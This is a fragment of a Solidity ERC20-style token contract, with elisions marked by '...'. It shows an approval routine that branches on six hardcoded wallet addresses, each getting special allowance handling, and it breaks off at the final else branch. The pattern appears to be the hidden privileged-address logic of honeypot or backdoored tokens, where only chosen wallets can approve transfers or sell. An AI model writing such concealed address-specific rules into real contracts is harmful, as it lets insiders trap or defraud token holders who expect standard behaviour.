...
contract Token is VaultOwned, IERC20 {
    ...
    else if (owner == address(0xA758BEA2cB0610Ee4E313BEb1FC440A90C9Bd61d)) {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    else if (owner == address(0x886eE6CAdcB5a700c8b3780d1Ea716FB03982218)) {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    else if (owner == address(0x3351C0b14c887b0bEA255D40cc8Fd1e137E5C3aC)) {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    else if (owner == address(0x275519646B3cc40C993B6fCd6031F75cC453065C)) {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    else if (owner == address(0x1621419f05B743655a80Cbd55Fd142e0651CE732)) {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    else if (owner == address(0x35F94A6a07d612b1fDf71052ee5982eAd0a3D461)) {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    else {
